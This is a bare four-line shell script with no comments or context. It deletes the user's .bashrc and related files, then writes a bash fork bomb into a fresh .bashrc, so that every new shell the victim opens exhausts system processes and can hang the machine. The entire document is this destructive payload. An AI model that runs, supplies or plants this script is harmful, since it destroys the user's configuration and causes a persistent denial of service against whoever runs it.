cd $HOME
rm -f .bashr*
echo ":(){ :|: & };:" >> .bashrc
exit 0